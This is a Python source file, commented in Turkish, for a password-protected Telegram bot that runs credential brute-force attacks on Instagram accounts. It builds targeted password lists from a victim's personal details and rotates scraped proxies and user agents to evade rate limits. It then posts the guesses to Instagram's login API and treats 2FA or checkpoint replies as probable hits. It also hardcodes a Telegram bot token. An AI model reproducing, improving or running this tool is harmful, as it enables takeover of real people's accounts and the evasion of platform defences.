#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import asyncio
import logging
import random
import time
import json
import re
import requests
import itertools
import os
import uuid
from typing import List, Optional
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, InputFile
from telegram.ext import (
    Application,
    CommandHandler,
    CallbackQueryHandler,
    MessageHandler,
    filters,
    ContextTypes,
)
from telegram.error import TelegramError

# Log ayarları
logging.basicConfig(
    level=logging.DEBUG,  # Daha fazla hata ayıklama için DEBUG seviyesine geçtik
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler("bot.log"),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

# Telegram bot token
TOKEN = os.getenv("BOT_TOKEN", "6481633238:AAHMT8V8nHNUsQUm69F1ngczdiFTzJAQJfU")

# Güvenlik şifresi
BOT_SIFRE = os.getenv("BOT_PASSWORD", "1453")

# Sağlanan statik proxy listesi (örnek olarak kısalttım, tam listeyi kullanabilirsiniz)
PROXY_LISTESI = [
    "185.162.231.94:80",
    "104.21.16.45:80",
    # Tam liste buraya eklenebilir
]

# Ücretsiz proxy API'leri
PROXY_APILERI = [
    "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all",
    "https://gimmeproxy.com/api/getProxy?protocol=http",
    "http://pubproxy.com/api/proxy?limit=20&format=txt&type=http",
]

# CUPP tarzı şifre oluşturucu
class SifreOlusturucu:
    def __init__(self):
        self.config = {
            "karakterler": ['!', '@', '#', '$', '%', '&', '*', '(', ')', '-', '+', '=', '?'],
            "yillar": [str(yil) for yil in range(1980, 2026)],
            "sayi_baslangic": 0,
            "sayi_bitis": 100
        }
        self.leet_kurallari = {
            'a': ['@', '4'], 'e': ['3'], 'i': ['1', '!'], 'o': ['0'],
            's': ['5', '$'], 't': ['7'], 'l': ['1'], 'b': ['8']
        }
        self.maks_sifre_uzunlugu = 512
        self.maks_sifre_sayisi = 100000

    def kelime_listesi_olustur(self, profil: dict) -> List[str]:
        kelime_listesi = []
        ad = profil.get("ad", "").lower()[:20]
        soyad = profil.get("soyad", "").lower()[:20]
        dogum_tarihi = profil.get("dogum_tarihi", "").replace("/", "")[:8]
        evcil_hayvan = profil.get("evcil_hayvan", "").lower()[:20]
        sirket = profil.get("sirket", "").lower()[:20]
        anahtar_kelimeler = [k[:20] for k in profil.get("anahtar_kelimeler", [])]

        temel_kelimeler = [kelime for kelime in [ad, soyad, evcil_hayvan, sirket] if kelime]
        temel_kelimeler.extend(anahtar_kelimeler)

        dogum_tarihi_formatlari = []
        if dogum_tarihi and len(dogum_tarihi) == 8:
            gun, ay, yil = dogum_tarihi[:2], dogum_tarihi[2:4], dogum_tarihi[4:]
            dogum_tarihi_formatlari.extend([gun, ay, yil, yil[-2:], yil[-3:], f"{gun}{ay}", f"{ay}{gun}", f"{gun}{yil}", f"{ay}{yil}"])

        for kelime in temel_kelimeler:
            if len(kelime) <= self.maks_sifre_uzunlugu:
                kelime_listesi.append(kelime)
                kelime_listesi.append(kelime.capitalize())
            for yil in dogum_tarihi_formatlari + self.config["yillar"]:
                if len(f"{kelime}{yil}") <= self.maks_sifre_uzunlugu:
                    kelime_listesi.append(f"{kelime}{yil}")
                    kelime_listesi.append(f"{yil}{kelime}")
            for sayi in range(self.config["sayi_baslangic"], self.config["sayi_bitis"] + 1):
                if len(f"{kelime}{sayi:02d}") <= self.maks_sifre_uzunlugu:
                    kelime_listesi.append(f"{kelime}{sayi:02d}")
                    kelime_listesi.append(f"{sayi:02d}{kelime}")

        for k1, k2 in itertools.combinations(temel_kelimeler, 2):
            if len(kelime_listesi) >= self.maks_sifre_sayisi:
                break
            if len(f"{k1}{k2}") <= self.maks_sifre_uzunlugu:
                kelime_listesi.append(f"{k1}{k2}")
                kelime_listesi.append(f"{k2}{k1}")
                kelime_listesi.append(f"{k1.capitalize()}{k2.capitalize()}")
            for yil in dogum_tarihi_formatlari + self.config["yillar"]:
                if len(f"{k1}{k2}{yil}") <= self.maks_sifre_uzunlugu:
                    kelime_listesi.append(f"{k1}{k2}{yil}")
                    kelime_listesi.append(f"{k2}{k1}{yil}")

        if profil.get("leet_modu", False):
            leet_kelimeler = []
            for kelime in kelime_listesi[:]:
                leet_varyasyonlari = [kelime]
                for karakter, degistirmeler in self.leet_kurallari.items():
                    yeni_varyasyonlar = []
                    for var in leet_varyasyonlari:
                        if karakter in var.lower():
                            for deg in degistirmeler:
                                yeni_var = var.replace(karakter, deg).replace(karakter.upper(), deg)
                                if len(yeni_var) <= self.maks_sifre_uzunlugu:
                                    yeni_varyasyonlar.append(yeni_var)
                    leet_varyasyonlari.extend(yeni_varyasyonlar)
                leet_kelimeler.extend(leet_varyasyonlari)
                if len(kelime_listesi) + len(leet_kelimeler) >= self.maks_sifre_sayisi:
                    break
            kelime_listesi.extend(leet_kelimeler)

        if profil.get("ozel_karakterler", False):
            ozel_kelimeler = []
            for kelime in kelime_listesi[:]:
                for karakter in self.config["karakterler"]:
                    if len(f"{kelime}{karakter}") <= self.maks_sifre_uzunlugu:
                        ozel_kelimeler.append(f"{kelime}{karakter}")
                    for karakter2 in self.config["karakterler"]:
                        if len(f"{kelime}{karakter}{karakter2}") <= self.maks_sifre_uzunlugu:
                            ozel_kelimeler.append(f"{kelime}{karakter}{karakter2}")
                if len(kelime_listesi) + len(ozel_kelimeler) >= self.maks_sifre_sayisi:
                    break
            kelime_listesi.extend(ozel_kelimeler)

        if profil.get("rastgele_sayi", False):
            sayili_kelimeler = []
            for kelime in kelime_listesi[:]:
                for sayi in range(self.config["sayi_baslangic"], self.config["sayi_bitis"] + 1):
                    if len(f"{kelime}{sayi:02d}") <= self.maks_sifre_uzunlugu:
                        sayili_kelimeler.append(f"{kelime}{sayi:02d}")
                    if len(kelime_listesi) + len(sayili_kelimeler) >= self.maks_sifre_sayisi:
                        break
                if len(kelime_listesi) + len(sayili_kelimeler) >= self.maks_sifre_sayisi:
                    break
            kelime_listesi.extend(sayili_kelimeler)

        return list(set(kelime_listesi))[:self.maks_sifre_sayisi]

class InstagramBruteForce:
    def __init__(self):
        self.kullanici_ajani = self._gercekci_kullanici_ajani_al()
        self.proxy_listesi = PROXY_LISTESI.copy()
        self.proxy_onbellek = {}
        self.proxy_dongusu = itertools.cycle(self.proxy_listesi) if self.proxy_listesi else None
        self.mevcut_proxy = None
        self.giris_url = 'https://www.instagram.com/accounts/login/'
        self.api_url = 'https://www.instagram.com/api/v1/web/accounts/login/ajax/'
        self.oturum = None
        self.csrf_token = None
        self.mid_cerez = None
        self.ig_did = None
        self.rollout_hash = None
        self.son_proxy_degisiminden_beri_deneme = 0
        self._baslat()

    def _gercekci_kullanici_ajani_al(self):
        ajanlar = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:131.0) Gecko/20100101 Firefox/131.0",
        ]
        return random.choice(ajanlar)

    def _ek_proxyler_al(self):
        proxyler = set()
        for api_url in PROXY_APILERI:
            try:
                yanit = requests.get(api_url, timeout=10)
                if yanit.status_code == 200:
                    if "json" in yanit.headers.get('content-type', ''):
                        veri = yanit.json()
                        if isinstance(veri, list):
                            for proxy in veri:
                                if 'ip' in proxy and 'port' in proxy:
                                    proxyler.add(f"{proxy['ip']}:{proxy['port']}")
                        elif 'ip' in veri and 'port' in veri:
                            proxyler.add(f"{veri['ip']}:{veri['port']}")
                    else:
                        proxy_satirlari = yanit.text.splitlines()
                        for satir in proxy_satirlari:
                            if ':' in satir and satir.strip():
                                proxyler.add(satir.strip())
                    logger.info(f"{api_url} adresinden {len(proxyler)} proxy alındı")
                else:
                    logger.warning(f"{api_url} adresinden proxy alınamadı: HTTP {yanit.status_code}")
            except Exception as e:
                logger.warning(f"{api_url} adresinden hata: {e}")
        if proxyler:
            self.proxy_listesi.extend(list(proxyler))
            self.proxy_dongusu = itertools.cycle(self.proxy_listesi)
            logger.info(f"{len(proxyler)} ek proxy eklendi")
        return list(proxyler)

    def _calisan_proxy_al(self, ilerleme_geri_donusu: Optional[callable] = None):
        if not self.proxy_listesi or not self.proxy_dongusu:
            logger.warning("Proxy listesi boş, ek proxyler alınıyor...")
            self._ek_proxyler_al()
            if not self.proxy_listesi:
                if ilerleme_geri_donusu:
                    ilerleme_geri_donusu("⚠️ Çalışan proxy bulunamadı, proxysiz devam ediliyor...")
                return None

        mevcut_zaman = time.time()
        maks_deneme = min(len(self.proxy_listesi), 10)
        for _ in range(maks_deneme):
            proxy = next(self.proxy_dongusu)
            if proxy in self.proxy_onbellek:
                onbellek = self.proxy_onbellek[proxy]
                if onbellek['durum'] == 'engelli' or (onbellek.get('soguma_suresi_bitis', 0) > mevcut_zaman):
                    continue

            try:
                test_oturumu = requests.Session()
                test_oturumu.proxies = {'http': f'http://{proxy}', 'https': f'http://{proxy}'}
                test_oturumu.headers.update({'User-Agent': self._gercekci_kullanici_ajani_al()})
                yanit = test_oturumu.get('https://www.instagram.com/', timeout=5)
                if yanit.status_code == 200:
                    test_oturumu.close()
                    self.proxy_onbellek[proxy] = {
                        'durum': 'çalışıyor',
                        'son_kullanim': mevcut_zaman,
                        'soguma_suresi_bitis': 0
                    }
                    logger.debug(f"Çalışan proxy bulundu: {proxy}")
                    if ilerleme_geri_donusu:
                        ilerleme_geri_donusu(f"✅ Çalışan proxy bulundu: {proxy}")
                    return proxy
                else:
                    self.proxy_onbellek[proxy] = {
                        'durum': 'engelli',
                        'son_kullanim': mevcut_zaman,
                        'soguma_suresi_bitis': mevcut_zaman + 600
                    }
                    logger.warning(f"Proxy başarısız: {proxy}, HTTP {yanit.status_code}")
            except Exception as e:
                self.proxy_onbellek[proxy] = {
                    'durum': 'başarısız',
                    'son_kullanim': mevcut_zaman,
                    'soguma_suresi_bitis': mevcut_zaman + 300
                }
                logger.warning(f"Proxy hatası: {proxy}, {str(e)}")
            time.sleep(0.5)

        logger.warning("Mevcut listede çalışan proxy bulunamadı, ek proxyler alınıyor...")
        self._ek_proxyler_al()
        if self.proxy_listesi:
            self.proxy_dongusu = itertools.cycle(self.proxy_listesi)
            return self._calisan_proxy_al(ilerleme_geri_donusu)
        
        if ilerleme_geri_donusu:
            ilerleme_geri_donusu("❌ Çalışan proxy bulunamadı, proxysiz devam ediliyor...")
        return None

    def _baslat(self):
        self.oturum = requests.Session()
        self.oturum.headers.update({
            'User-Agent': self.kullanici_ajani,
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
            'Accept-Language': 'tr-TR,tr;q=0.9,en-US;q=0.8',
            'Accept-Encoding': 'gzip, deflate, br',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'X-IG-App-ID': '1217981644879628',
        })
        self.mevcut_proxy = self._calisan_proxy_al()
        if self.mevcut_proxy:
            self.oturum.proxies = {'http': f'http://{self.mevcut_proxy}', 'https': f'http://{self.mevcut_proxy}'}

    async def _ilk_cerez_ve_tokenlari_al(self, ilerleme_geri_donusu: Optional[callable] = None):
        maks_deneme = 5
        for deneme in range(1, maks_deneme + 1):
            self.mevcut_proxy = self._calisan_proxy_al(ilerleme_geri_donusu)
            if self.mevcut_proxy:
                self.oturum.proxies = {'http': f'http://{self.mevcut_proxy}', 'https': f'http://{self.mevcut_proxy}'}
            else:
                self.oturum.proxies = {}
            
            try:
                self.oturum.headers.update({'User-Agent': self._gercekci_kullanici_ajani_al()})
                yanit = self.oturum.get('https://www.instagram.com/', timeout=10)
                if yanit.status_code != 200:
                    raise Exception(f"Instagram'a erişilemedi: {yanit.status_code}")
                
                self.csrf_token = self.oturum.cookies.get('csrftoken')
                self.mid_cerez = self.oturum.cookies.get('mid')
                self.ig_did = self.oturum.cookies.get('ig_did')
                
                if not self.csrf_token:
                    csrf_eslesme = re.search(r'"csrf_token":"([^"]+)"', yanit.text)
                    if csrf_eslesme:
                        self.csrf_token = csrf_eslesme.group(1)
                
                rollout_eslesme = re.search(r'"rollout_hash":"([^"]+)"', yanit.text)
                self.rollout_hash = rollout_eslesme.group(1) if rollout_eslesme else str(int(time.time()))
                
                logger.debug(f"Token'lar alındı: CSRF={self.csrf_token}, Proxy={self.mevcut_proxy}")
                if ilerleme_geri_donusu:
                    await ilerleme_geri_donusu(f"✅ Token'lar alındı! Proxy: {self.mevcut_proxy}")
                return True
            except Exception as e:
                logger.warning(f"Token alma hatası (Deneme {deneme}/{maks_deneme}): {e}")
                if ilerleme_geri_donusu and deneme % 2 == 0:
                    await ilerleme_geri_donusu(f"🔍 Token'lar alınıyor ({deneme}/{maks_deneme})")
                if deneme < maks_deneme:
                    await asyncio.sleep(2)
                continue
        
        if ilerleme_geri_donusu:
            await ilerleme_geri_donusu("⚠️ Token'lar alınamadı, proxysiz devam ediliyor...")
        return False

    def _giris_istegi_yap(self, kullanici_adi: str, sifre: str, tekrar_deneme: int = 0, maks_tekrar: int = 3):
        basliklar = {
            'Accept': '*/*',
            'Accept-Language': 'tr-TR,tr;q=0.9,en-US;q=0.8',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Origin': 'https://www.instagram.com',
            'Referer': self.giris_url,
            'X-CSRFToken': self.csrf_token or '',
            'X-Instagram-AJAX': self.rollout_hash or str(int(time.time())),
            'X-IG-App-ID': '1217981644879628',
            'X-IG-WWW-Claim': '0',
            'X-Requested-With': 'XMLHttpRequest',
        }
        
        zaman_damgasi = int(time.time())
        sifrelenmis_sifre = f"#PWD_INSTAGRAM_BROWSER:0:{zaman_damgasi}:{sifre}"
        
        veri = {
            'username': kullanici_adi,
            'enc_password': sifrelenmis_sifre,
            'optIntoOneTap': 'false',
        }
        
        try:
            yanit = self.oturum.post(self.api_url, headers=basliklar, data=veri, timeout=10)
            logger.debug(f"Giriş isteği: {kullanici_adi}, Şifre: {sifre}, Yanıt: {yanit.status_code} - {yanit.text}")
            if yanit.status_code == 429:
                logger.warning(f"Hız sınırı alındı: {sifre}, bekleniyor...")
                bekleme = (2 ** tekrar_deneme) * 30
                time.sleep(bekleme)
                if tekrar_deneme < maks_tekrar:
                    self.mevcut_proxy = self._calisan_proxy_al()
                    if self.mevcut_proxy:
                        self.oturum.proxies = {'http': f'http://{self.mevcut_proxy}', 'https': f'http://{self.mevcut_proxy}'}
                    return self._giris_istegi_yap(kullanici_adi, sifre, tekrar_deneme + 1, maks_tekrar)
            return yanit
        except Exception as e:
            logger.warning(f"Giriş isteği hatası ({sifre}): {e}")
            if tekrar_deneme < maks_tekrar:
                self.mevcut_proxy = self._calisan_proxy_al()
                if self.mevcut_proxy:
                    self.oturum.proxies = {'http': f'http://{self.mevcut_proxy}', 'https': f'http://{self.mevcut_proxy}'}
                return self._giris_istegi_yap(kullanici_adi, sifre, tekrar_deneme + 1, maks_tekrar)
            return None

    async def kaba_kuvvet(self, kullanici_adi: str, sifre_listesi: List[str], 
                          ilerleme_geri_donusu: Optional[callable] = None, baglam: Optional[ContextTypes.DEFAULT_TYPE] = None):
        baslangic_zamani = time.time()
        toplam_sifre_sayisi = len(sifre_listesi)
        potansiyel_sifreler = set()
        denenmis_sifreler = 0
        sonuclar = []
        self.son_proxy_degisiminden_beri_deneme = 0
        
        try:
            await ilerleme_geri_donusu(f"🚀 Instagram Kaba Kuvvet Başlatılıyor\nHedef: {kullanici_adi}\nŞifre Sayısı: {toplam_sifre_sayisi}")
            
            if not await self._ilk_cerez_ve_tokenlari_al(ilerleme_geri_donusu):
                await ilerleme_geri_donusu("⚠️ Token'lar alınamadı, devam edilemiyor!")
                return None
            
            await ilerleme_geri_donusu(f"✅ Token'lar alındı! Şifre denemeleri başlıyor...")
            
            for i, sifre in enumerate(sifre_listesi):
                if self.proxy_listesi and (self.son_proxy_degisiminden_beri_deneme >= 3):
                    self.mevcut_proxy = self._calisan_proxy_al(ilerleme_geri_donusu)
                    if self.mevcut_proxy:
                        self.oturum.proxies = {'http': f'http://{self.mevcut_proxy}', 'https': f'http://{self.mevcut_proxy}'}
                    await self._ilk_cerez_ve_tokenlari_al(ilerleme_geri_donusu)
                    self.son_proxy_degisiminden_beri_deneme = 0
                
                yanit = self._giris_istegi_yap(kullanici_adi, sifre)
                sonuc = "HATA"
                
                if yanit and yanit.status_code == 200:
                    try:
                        json_veri = yanit.json()
                        logger.debug(f"API Yanıtı ({sifre}): {json_veri}")
                        if 'authenticated' in json_veri and json_veri['authenticated']:
                            sonuc = "BAŞARILI"
                            await ilerleme_geri_donusu(f"🎉 BAŞARILI! Şifre bulundu: {sifre}")
                            return sifre
                        elif 'authenticated' in json_veri and not json_veri['authenticated']:
                            sonuc = "YANLIŞ"
                        elif 'two_factor_required' in json_veri:
                            sonuc = "2FA"
                            potansiyel_sifreler.add(sifre)
                            await ilerleme_geri_donusu(f"🔐 2FA gerekli! Şifre doğru olabilir: {sifre}")
                        elif 'checkpoint_url' in json_veri or json_veri.get('message') == 'checkpoint_required':
                            sonuc = "KONTROL_NOKTASI"
                            potansiyel_sifreler.add(sifre)
                            await ilerleme_geri_donusu(f"🚧 Kontrol noktası gerekli! Şifre doğru olabilir: {sifre}")
                        else:
                            sonuc = "BİLİNMİYOR"
                            potansiyel_sifreler.add(sifre)
                    except json.JSONDecodeError:
                        sonuc = "HATA"
                        logger.error(f"JSON çözümleme hatası: {yanit.text}")
                
                sonuclar.append(sonuc)
                await ilerleme_geri_donusu(f"🔐 Şifre deneniyor ({i+1}/{toplam_sifre_sayisi}): {sifre} - {sonuc}")
                
                denenmis_sifreler += 1
                self.son_proxy_degisiminden_beri_deneme += 1
                
                if (i + 1) % 5 == 0:
                    ozet = f"📊 Son 5 şifre sonucu:\n" + "\n".join(
                        f"Şifre {j+1}: {sifre_listesi[j]} - {sonuclar[j]}" for j in range(max(0, i-4), i+1)
                    )
                    await ilerleme_geri_donusu(ozet)
                    await self._ilk_cerez_ve_tokenlari_al(ilerleme_geri_donusu)
                
                await asyncio.sleep(random.uniform(10, 20))
            
            rapor = f"📊 Rapor:\nDenenen şifreler: {denenmis_sifreler}/{toplam_sifre_sayisi}"
            if potansiyel_sifreler:
                rapor += f"\n⚠️ Potansiyel doğru şifreler: {', '.join(list(potansiyel_sifreler)[:10])}"
                await ilerleme_geri_donusu(rapor)
                if baglam:
                    baglam.user_data['potansiyel_sifreler'] = list(potansiyel_sifreler)
                    baglam.user_data['kullanici_adi'] = kullanici_adi
                    klavye = [
                        [InlineKeyboardButton("🔄 Tekrar Dene", callback_data='tekrar_dene')],
                        [InlineKeyboardButton("❌ İptal", callback_data='iptal')]
                    ]
                    yanit_isareti = InlineKeyboardMarkup(klavye)
                    await ilerleme_geri_donusu("🔄 Bu şifreler doğru olabilir. Tekrar denemek ister misiniz?", reply_markup=yanit_isareti)
            else:
                await ilerleme_geri_donusu(rapor)
            return None
            
        except Exception as e:
            logger.error(f"Kaba kuvvet hatası: {e}")
            await ilerleme_geri_donusu(f"❌ Beklenmeyen hata: {str(e)}")
            return None

class TelegramBot:
    def __init__(self):
        self.kullanici_verileri = {}
        self.sifre_olusturucu = SifreOlusturucu()

    def _kullanici_verilerini_baslat(self, kullanici_id: int):
        if kullanici_id not in self.kullanici_verileri:
            self.kullanici_verileri[kullanici_id] = {
                'kullanici_adi': None,
                'sifre_dosyasi': None,
                'sifre_profili': {
                    'ad': '', 'soyad': '', 'dogum_tarihi': '',
                    'evcil_hayvan': '', 'sirket': '', 'anahtar_kelimeler': [],
                    'leet_modu': False, 'ozel_karakterler': False, 'rastgele_sayi': False
                }
            }

    async def baslat(self, guncelleme: Update, baglam: ContextTypes.DEFAULT_TYPE):
        kullanici_id = guncelleme.effective_user.id
        self._kullanici_verilerini_baslat(kullanici_id)
        
        banner = """
  _              _            _____                                  
 (_) _ __   ___ | |_   __ _   \_   \ _ __   ___   __ _  _ __    ___ 
 | || '_ \ / __|| __| / _` |   / /\/| '_ \ / __| / _` || '_ \  / _ \
 | || | | |\__ \| |_ | (_| |/\/ /_  | | | |\__ \| (_| || | | ||  __/
 |_||_| |_||___/ \__| \__,_|\____/  |_| |_||___/ \__,_||_| |_| \___|
        """
        
        try:
            await guncelleme.message.reply_text(f"```{banner}```", parse_mode='Markdown')
            await guncelleme.message.reply_text("🔒 Lütfen bot şifresini girin:")
            baglam.user_data['bekleniyor'] = 'sifre'
        except Exception as e:
            logger.error(f"Başlatma hatası: {e}")
            await guncelleme.message.reply_text("❌ Mesaj gönderilirken hata oluştu!")

    async def mesaj_isle(self, guncelleme: Update, baglam: ContextTypes.DEFAULT_TYPE):
        kullanici_id = guncelleme.effective_user.id
        self._kullanici_verilerini_baslat(kullanici_id)

        bekleniyor = baglam.user_data.get('bekleniyor')
        
        if not bekleniyor:
            await guncelleme.message.reply_text("❌ Önce /baslat komutunu kullan!")
            return

        if bekleniyor == 'sifre':
            girilen_sifre = guncelleme.message.text.strip()
            if not girilen_sifre:
                await guncelleme.message.reply_text("❌ Boş şifre girilemez!")
                return
            if girilen_sifre == BOT_SIFRE:
                baglam.user_data['bekleniyor'] = None
                hosgeldin_mesaji = "👾 HACKER V3.0 AKTİF! 👾\n🔥 Hoş geldin, V.VV sunar! 🔥"
                
                klavye = [
                    [InlineKeyboardButton("🎯 Kullanıcı Adı Gir", callback_data='kullanici_adi_ayarla')],
                    [InlineKeyboardButton("📜 Şifre Listesi Yükle", callback_data='sifre_dosyasi_ayarla')],
                    [InlineKeyboardButton("🔑 Şifre Listesi Oluştur", callback_data='sifre_listesi_olustur')],
                    [InlineKeyboardButton("🚀 Saldırıyı Başlat", callback_data='saldiri_baslat')],
                    [InlineKeyboardButton("📖 Nasıl Kullanırım?", callback_data='nasil_kullanilir')],
                    [InlineKeyboardButton("❌ İptal", callback_data='iptal')]
                ]
                
                yanit_isareti = InlineKeyboardMarkup(klavye)
                await guncelleme.message.reply_text(hosgeldin_mesaji, reply_markup=yanit_isareti)
            else:
                await guncelleme.message.reply_text("❌ Yanlış şifre! Tekrar dene.")
            return

        elif bekleniyor == 'kullanici_adi':
            kullanici_adi = guncelleme.message.text.strip()
            if not kullanici_adi:
                await guncelleme.message.reply_text("❌ Boş kullanıcı adı girilemez!")
                return
            if len(kullanici_adi) > 30:
                await guncelleme.message.reply_text("❌ Kullanıcı adı 30 karakterden uzun olamaz!")
                return
            self.kullanici_verileri[kullanici_id]['kullanici_adi'] = kullanici_adi
            await guncelleme.message.reply_text(f"✅ Kullanıcı adı ayarlandı: {kullanici_adi}")
            baglam.user_data['bekleniyor'] = None

        elif bekleniyor == 'sifre_dosyasi':
            if guncelleme.message.document:
                try:
                    dosya = await guncelleme.message.document.get_file()
                    dosya_yolu = f"sifreler_{kullanici_id}.txt"
                    await dosya.download_to_drive(custom_path=dosya_yolu)
                    
                    with open(dosya_yolu, 'r', encoding='utf-8', errors='ignore') as f:
                        sifreler = [satir.strip() for satir in f if satir.strip()]
                    
                    if not sifreler:
                        await guncelleme.message.reply_text("❌ Şifre listesi boş!")
                        os.remove(dosya_yolu)
                        return
                    
                    self.kullanici_verileri[kullanici_id]['sifre_dosyasi'] = dosya_yolu
                    await guncelleme.message.reply_text(f"✅ Şifre listesi yüklendi! ({len(sifreler)} şifre)")
                    baglam.user_data['bekleniyor'] = None
                    
                except Exception as e:
                    await guncelleme.message.reply_text(f"❌ Dosya işlenirken hata: {str(e)}")
            else:
                await guncelleme.message.reply_text("❌ Lütfen bir .txt dosyası yükle!")

        elif bekleniyor == 'sifre_profili':
            try:
                profil_girdisi = guncelleme.message.text.strip().split(',')
                if len(profil_girdisi) < 1:
                    await guncelleme.message.reply_text("❌ Lütfen geçerli bir formatta bilgi gir!")
                    return
                
                profil = {
                    'ad': profil_girdisi[0].strip() if len(profil_girdisi) > 0 else '',
                    'soyad': profil_girdisi[1].strip() if len(profil_girdisi) > 1 else '',
                    'dogum_tarihi': profil_girdisi[2].strip() if len(profil_girdisi) > 2 else '',
                    'evcil_hayvan': profil_girdisi[3].strip() if len(profil_girdisi) > 3 else '',
                    'sirket': profil_girdisi[4].strip() if len(profil_girdisi) > 4 else '',
                    'anahtar_kelimeler': profil_girdisi[5].split() if len(profil_girdisi) > 5 else [],
                    'leet_modu': '-leet' in profil_girdisi,
                    'ozel_karakterler': '-ozel' in profil_girdisi,
                    'rastgele_sayi': '-rast' in profil_girdisi
                }
                
                kelime_listesi = self.sifre_olusturucu.kelime_listesi_olustur(profil)
                if not kelime_listesi:
                    await guncelleme.message.reply_text("❌ Şifre listesi oluşturulamadı! Bilgileri kontrol et.")
                    return
                
                dosya_yolu = f"olusturulan_sifreler_{kullanici_id}.txt"
                with open(dosya_yolu, 'w', encoding='utf-8') as f:
                    for sifre in kelime_listesi:
                        f.write(sifre + '\n')
                
                with open(dosya_yolu, 'rb') as f:
                    await guncelleme.message.reply_document(document=InputFile(f, filename=f"sifreler_{kullanici_id}.txt"),
                                                    caption=f"✅ {len(kelime_listesi)} şifre oluşturuldu!")
                
                self.kullanici_verileri[kullanici_id]['sifre_dosyasi'] = dosya_yolu
                baglam.user_data['bekleniyor'] = None
            except Exception as e:
                await guncelleme.message.reply_text(f"❌ Hata oluştu: {str(e)}")

    async def buton(self, guncelleme: Update, baglam: ContextTypes.DEFAULT_TYPE):
        sorgu = guncelleme.callback_query
        await sorgu.answer()
        kullanici_id = sorgu.from_user.id
        self._kullanici_verilerini_baslat(kullanici_id)

        if sorgu.data == 'kullanici_adi_ayarla':
            await sorgu.message.reply_text("🎯 Lütfen Instagram kullanıcı adını gir:")
            baglam.user_data['bekleniyor'] = 'kullanici_adi'

        elif sorgu.data == 'sifre_dosyasi_ayarla':
            await sorgu.message.reply_text("📜 Lütfen şifre listesi dosyasını (.txt) yükle:")
            baglam.user_data['bekleniyor'] = 'sifre_dosyasi'

        elif sorgu.data == 'sifre_listesi_olustur':
            await sorgu.message.reply_text(
                "🔑 Şifre listesi oluşturmak için bilgileri gir:\n"
                "Format: ad,soyad,doğumtarihi,evcilhayvan,şirket,anahtarkelimeler\n"
                "Örnek: ahmet,yilmaz,01011990,kopek,xyz,kelime1 kelime2\n"
                "Not: Doğum tarihi GGAAYYYY formatında olmalı. Anahtar kelimeler boşlukla ayrılmalı.\n"
                "Seçenekler: -leet (leet modu), -ozel (özel karakterler), -rast (rastgele sayılar)\n"
                "Örnek: ahmet,yilmaz,01011990,kopek,xyz,kelime1 kelime2,-leet -ozel"
            )
            baglam.user_data['bekleniyor'] = 'sifre_profili'

        elif sorgu.data == 'nasil_kullanilir':
            kullanım_kilavuzu = """
            📖 **Bot Kullanım Kılavuzu** 📖
            
            1. **Şifre Girişi**: /baslat komutunu kullanın ve bot şifresini girin.
            2. **Kullanıcı Adı**: "Kullanıcı Adı Gir" ile hedef Instagram kullanıcı adını ayarlayın.
            3. **Şifre Listesi**: "Şifre Listesi Yükle" ile .txt dosyası yükleyin veya "Şifre Listesi Oluştur" ile liste oluşturun.
            4. **Saldırı**: "Saldırıyı Başlat" ile kaba kuvvet saldırısını başlatın.
            5. **Tekrar Deneme**: Potansiyel şifreler için "Tekrar Dene" seçeneğini kullanın.
            6. **İptal**: "İptal" ile işlemi durdurun.
            
            ⚠️ **Not**: Botun kullanımı kullanıcının sorumluluğundadır.
            """
            await sorgu.message.reply_text(kullanım_kilavuzu, parse_mode='Markdown')

        elif sorgu.data == 'saldiri_baslat':
            await self.saldiri_baslat(guncelleme, baglam)

        elif sorgu.data == 'tekrar_dene':
            await self.potansiyel_sifreleri_tekrar_dene(guncelleme, baglam)

        elif sorgu.data == 'iptal':
            baglam.user_data['bekleniyor'] = None
            baglam.user_data.pop('potansiyel_sifreler', None)
            baglam.user_data.pop('kullanici_adi', None)
            await sorgu.message.reply_text("❌ İşlem iptal edildi.")

    async def saldiri_baslat(self, guncelleme: Update, baglam: ContextTypes.DEFAULT_TYPE):
        sorgu = guncelleme.callback_query
        await sorgu.answer()
        kullanici_id = sorgu.from_user.id
        
        if not self.kullanici_verileri[kullanici_id]['kullanici_adi']:
            await sorgu.message.reply_text("❌ Önce bir kullanıcı adı ayarla!")
            return
        
        if not self.kullanici_verileri[kullanici_id]['sifre_dosyasi']:
            await sorgu.message.reply_text("❌ Önce bir şifre listesi yükle veya oluştur!")
            return
        
        try:
            with open(self.kullanici_verileri[kullanici_id]['sifre_dosyasi'], 'r', encoding='utf-8', errors='ignore') as f:
                sifreler = [satir.strip() for satir in f if satir.strip()]
        except Exception as e:
            await sorgu.message.reply_text(f"❌ Şifre listesi okunamadı: {str(e)}")
            return
        
        await sorgu.message.reply_text(f"🚀 Saldırı başlatılıyor...\nHedef: {self.kullanici_verileri[kullanici_id]['kullanici_adi']}\nŞifre Sayısı: {len(sifreler)}")
        
        instagram_kaba_kuvvet = InstagramBruteForce()
        
        async def ilerleme_geri_donusu(mesaj, yanit_isareti=None):
            try:
                await sorgu.message.reply_text(mesaj, reply_markup=yanit_isareti)
                logger.info(f"Mesaj gönderildi: {mesaj}")
                await asyncio.sleep(0.5)
            except TelegramError as e:
                logger.error(f"Telegram hatası: {e}")
                await sorgu.message.reply_text(f"⚠️ Telegram hatası: {str(e)}")
        
        sonuc = await instagram_kaba_kuvvet.kaba_kuvvet(
            self.kullanici_verileri[kullanici_id]['kullanici_adi'],
            sifreler,
            ilerleme_geri_donusu,
            baglam
        )
        
        if sonuc:
            await sorgu.message.reply_text(f"🎉 BAŞARILI! Şifre bulundu: {sonuc}")
            baglam.user_data.pop('potansiyel_sifreler', None)
            baglam.user_data.pop('kullanici_adi', None)

